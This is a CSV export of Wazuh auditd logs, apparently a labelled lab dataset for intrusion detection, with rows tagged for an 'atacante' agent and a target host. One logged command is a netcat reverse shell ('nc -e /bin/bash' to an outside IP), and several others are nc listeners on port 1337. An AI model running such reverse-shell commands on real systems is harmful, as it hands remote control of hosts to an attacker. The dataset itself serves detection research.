Agent_name,User,Timestamp,Decoder_name,Description,Full_log,Activity,Action
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:15.641,auditd,1,"type=SYSCALL msg=audit(1741274773.292:5018): arch=c000003e syscall=59 success=yes exit=0 a0=5c8cf5a19d20 a1=5c8cf5a04850 a2=5c8cf5a19b88 a3=2 items=2 ppid=6088 pid=6090 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu"" type=EXECVE msg=audit(1741274773.292:5018): argc=3 a0=""head"" a1=""-n"" a2=""1"" type=CWD msg=audit(1741274773.292:5018): cwd=""/home/ubuntu"" type=PATH msg=audit(1741274773.292:5018): item=0 name=""/usr/bin/head"" inode=524823 dev=08:03 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741274773.292:5018): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=551795 dev=08:03 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741274773.292:5018): proctitle=68656164002D6E0031",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:08.570,auditd,1,"type=SYSCALL msg=audit(1741274767.980:4666): arch=c000003e syscall=59 success=yes exit=0 a0=649c1e162d20 a1=649c1e14d850 a2=649c1e162b88 a3=2 items=2 ppid=5630 pid=5632 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu""",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:08.619,auditd,1,"type=SYSCALL msg=audit(1741274767.998:4678): arch=c000003e syscall=59 success=yes exit=0 a0=649c1e162d20 a1=649c1e14d850 a2=649c1e162b88 a3=2 items=2 ppid=5645 pid=5647 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu""",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:08.634,auditd,1,"type=SYSCALL msg=audit(1741274768.015:4682): arch=c000003e syscall=59 success=yes exit=0 a0=649c1e162d20 a1=649c1e14d850 a2=649c1e162b88 a3=2 items=2 ppid=5650 pid=5652 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu""",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:08.651,auditd,1,"type=SYSCALL msg=audit(1741274768.015:4686): arch=c000003e syscall=59 success=yes exit=0 a0=649c1e162d20 a1=649c1e14d850 a2=649c1e162b88 a3=2 items=2 ppid=5655 pid=5657 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu""",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:08.669,auditd,1,"type=SYSCALL msg=audit(1741274768.015:4690): arch=c000003e syscall=59 success=yes exit=0 a0=649c1e162d20 a1=649c1e14d850 a2=649c1e162b88 a3=2 items=2 ppid=5660 pid=5662 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu"" type=EXECVE msg=audit(1741274768.015:4690): argc=3 a0=""head"" a1=""-n"" a2=""1"" type=CWD msg=audit(1741274768.015:4690): cwd=""/home/ubuntu"" type=PATH msg=audit(1741274768.015:4690): item=0 name=""/usr/bin/head"" inode=524823 dev=08:03 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741274768.015:4690): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=551795 dev=08:03 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741274768.015:4690): proctitle=68656164002D6E0031",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:10.575,auditd,1,"type=SYSCALL msg=audit(1741274769.895:4760): arch=c000003e syscall=59 success=yes exit=0 a0=62ec07742d20 a1=62ec0772d850 a2=62ec07742b88 a3=2 items=2 ppid=5761 pid=5763 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu""",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:10.594,auditd,1,"type=SYSCALL msg=audit(1741274769.895:4764): arch=c000003e syscall=59 success=yes exit=0 a0=62ec07742d20 a1=62ec0772d850 a2=62ec07742b88 a3=2 items=2 ppid=5766 pid=5768 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu"" type=EXECVE msg=audit(1741274769.895:4764): argc=3 a0=""head"" a1=""-n"" a2=""1"" type=CWD msg=audit(1741274769.895:4764): cwd=""/home/ubuntu"" type=PATH msg=audit(1741274769.895:4764): item=0 name=""/usr/bin/head"" inode=524823 dev=08:03 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741274769.895:4764): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=551795 dev=08:03 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741274769.895:4764): proctitle=68656164002D6E0031",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:10.615,auditd,1,"type=SYSCALL msg=audit(1741274769.912:4772): arch=c000003e syscall=59 success=yes exit=0 a0=62ec07742d20 a1=62ec0772d850 a2=62ec07742b88 a3=2 items=2 ppid=5776 pid=5778 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu""",command,Command executed
atacante_ab14b149da3219811dceef899270ca18b585ce05,ubuntu,2025-03-06 15:26:10.639,auditd,1,"type=SYSCALL msg=audit(1741274769.912:4776): arch=c000003e syscall=59 success=yes exit=0 a0=62ec07742d20 a1=62ec0772d850 a2=62ec07742b88 a3=2 items=2 ppid=5781 pid=5783 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=5 comm=""head"" exe=""/usr/bin/head"" subj=unconfined key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""ubuntu"" UID=""ubuntu"" GID=""ubuntu"" EUID=""ubuntu"" SUID=""ubuntu"" FSUID=""ubuntu"" EGID=""ubuntu"" SGID=""ubuntu"" FSGID=""ubuntu""",command,Command executed
host-accesible_22cdbe317138f0d8f0137e45f930a42e950d036c,irene,2025-03-06 16:00:10.720,auditd,0,"type=SYSCALL msg=audit(1741276888.193:345): arch=c000003e syscall=59 success=yes exit=0 a0=55a9ec9cf0f0 a1=55a9ec910050 a2=55a9ec9db370 a3=8 items=2 ppid=3835 pid=4004 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=6 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene"" type=EXECVE msg=audit(1741276888.193:345): argc=5 a0=""nc"" a1=""-e"" a2=""/bin/bash"" a3=""10.10.34.2"" a4=""80"" type=CWD msg=audit(1741276888.193:345): cwd=""/home/irene"" type=PATH msg=audit(1741276888.193:345): item=0 name=""/bin/nc"" inode=131172 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741276888.193:345): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=656855 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741276888.193:345): proctitle=6E63002D65002F62696E2F626173680031302E31302E33342E32003830",command,Command executed
host-accesible_22cdbe317138f0d8f0137e45f930a42e950d036c,irene,2025-03-06 16:02:04.898,auditd,0,"type=SYSCALL msg=audit(1741277001.857:351): arch=c000003e syscall=59 success=yes exit=0 a0=55a9ec9db050 a1=55a9ec9cf3c0 a2=55a9ec9db370 a3=0 items=2 ppid=3835 pid=4032 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=6 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_22cdbe317138f0d8f0137e45f930a42e950d036c,irene,2025-03-06 16:08:23.415,auditd,0,"type=SYSCALL msg=audit(1741277380.629:369): arch=c000003e syscall=59 success=yes exit=0 a0=55a9ec9d2050 a1=55a9ec94c1b0 a2=55a9ec9db370 a3=8 items=2 ppid=3835 pid=4176 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=6 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:08:06.051,auditd,0,"type=SYSCALL msg=audit(1741277227.780:331): arch=c000003e syscall=59 success=yes exit=0 a0=555c795b40c0 a1=555c795cf800 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4291 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:10:58.284,auditd,0,"type=SYSCALL msg=audit(1741277399.592:347): arch=c000003e syscall=59 success=yes exit=0 a0=555c7951dca0 a1=555c79565df0 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4406 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_22cdbe317138f0d8f0137e45f930a42e950d036c,irene,2025-03-06 16:11:57.698,auditd,0,"type=SYSCALL msg=audit(1741277596.029:383): arch=c000003e syscall=59 success=yes exit=0 a0=55a9ec918af0 a1=55a9ec9f4400 a2=55a9ec9db370 a3=0 items=2 ppid=3835 pid=4212 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=6 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:13:42.546,auditd,0,"type=SYSCALL msg=audit(1741277564.716:368): arch=c000003e syscall=59 success=yes exit=0 a0=555c79590b50 a1=555c79474ac0 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4446 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene"" type=EXECVE msg=audit(1741277564.716:368): argc=3 a0=""nc"" a1=""-l"" a2=""1337"" type=CWD msg=audit(1741277564.716:368): cwd=""/home/irene"" type=PATH msg=audit(1741277564.716:368): item=0 name=""/bin/nc"" inode=131172 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741277564.716:368): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=656855 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741277564.716:368): proctitle=6E63002D6C0031333337",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:12:28.435,auditd,0,"type=SYSCALL msg=audit(1741277489.460:356): arch=c000003e syscall=59 success=yes exit=0 a0=555c795bce10 a1=555c7946d7a0 a2=555c795be810 a3=0 items=2 ppid=4200 pid=4420 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:13:04.497,auditd,0,"type=SYSCALL msg=audit(1741277526.404:359): arch=c000003e syscall=59 success=yes exit=0 a0=555c795b0510 a1=555c795be390 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4437 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:13:04.505,auditd,0,"type=SYSCALL msg=audit(1741277526.404:361): arch=c000003e syscall=59 success=yes exit=0 a0=555c795bce10 a1=555c795ce090 a2=555c795be810 a3=0 items=2 ppid=4200 pid=4436 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene"" type=EXECVE msg=audit(1741277526.404:361): argc=3 a0=""nc"" a1=""-l"" a2=""1337"" type=CWD msg=audit(1741277526.404:361): cwd=""/home/irene"" type=PATH msg=audit(1741277526.404:361): item=0 name=""/bin/nc"" inode=131172 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741277526.404:361): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=656855 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741277526.404:361): proctitle=6E63002D6C0031333337",command,Command executed
host-accesible_22cdbe317138f0d8f0137e45f930a42e950d036c,irene,2025-03-06 16:12:49.781,auditd,0,"type=SYSCALL msg=audit(1741277648.125:387): arch=c000003e syscall=59 success=yes exit=0 a0=55a9ec9f67e0 a1=55a9ec9d4470 a2=55a9ec9db370 a3=0 items=2 ppid=3835 pid=4229 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=6 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:14:02.556,auditd,0,"type=SYSCALL msg=audit(1741277583.856:375): arch=c000003e syscall=59 success=yes exit=0 a0=555c7947f330 a1=555c795505a0 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4454 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:15:26.649,auditd,0,"type=SYSCALL msg=audit(1741277668.024:390): arch=c000003e syscall=59 success=yes exit=0 a0=555c79537000 a1=555c795bc5f0 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4476 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:15:26.652,auditd,0,"type=SYSCALL msg=audit(1741277668.024:392): arch=c000003e syscall=59 success=yes exit=0 a0=555c795367b0 a1=555c794d8b80 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4475 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene"" type=EXECVE msg=audit(1741277668.024:392): argc=3 a0=""nc"" a1=""-l"" a2=""1337"" type=CWD msg=audit(1741277668.024:392): cwd=""/home/irene"" type=PATH msg=audit(1741277668.024:392): item=0 name=""/bin/nc"" inode=131172 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741277668.024:392): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=656855 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741277668.024:392): proctitle=6E63002D6C0031333337",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:15:16.637,auditd,0,"type=SYSCALL msg=audit(1741277658.248:383): arch=c000003e syscall=59 success=yes exit=0 a0=555c79535f40 a1=555c79565df0 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4470 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:15:50.680,auditd,0,"type=SYSCALL msg=audit(1741277693.108:395): arch=c000003e syscall=59 success=yes exit=0 a0=555c79537000 a1=555c795b2260 a2=555c795be810 a3=8 items=2 ppid=4200 pid=4482 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=5 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene""",command,Command executed
host-accesible_ab14b149da3219811dceef899270ca18b585ce05,irene,2025-03-06 16:18:34.945,auditd,0,"type=SYSCALL msg=audit(1741277856.488:557): arch=c000003e syscall=59 success=yes exit=0 a0=55d411b239d0 a1=55d411b40cd0 a2=55d411bb1370 a3=0 items=2 ppid=4574 pid=4624 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 egid=1003 sgid=1003 fsgid=1003 tty=pts0 ses=8 comm=""nc"" exe=""/bin/nc.openbsd"" key=""audit-wazuh-c"" ARCH=x86_64 SYSCALL=execve AUID=""irene"" UID=""irene"" GID=""irene"" EUID=""irene"" SUID=""irene"" FSUID=""irene"" EGID=""irene"" SGID=""irene"" FSGID=""irene"" type=EXECVE msg=audit(1741277856.488:557): argc=3 a0=""nc"" a1=""-l"" a2=""1337"" type=CWD msg=audit(1741277856.488:557): cwd=""/home/irene"" type=PATH msg=audit(1741277856.488:557): item=0 name=""/bin/nc"" inode=131172 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PATH msg=audit(1741277856.488:557): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=656855 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0 OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1741277856.488:557): proctitle=6E63002D6C0031333337",command,Command executed
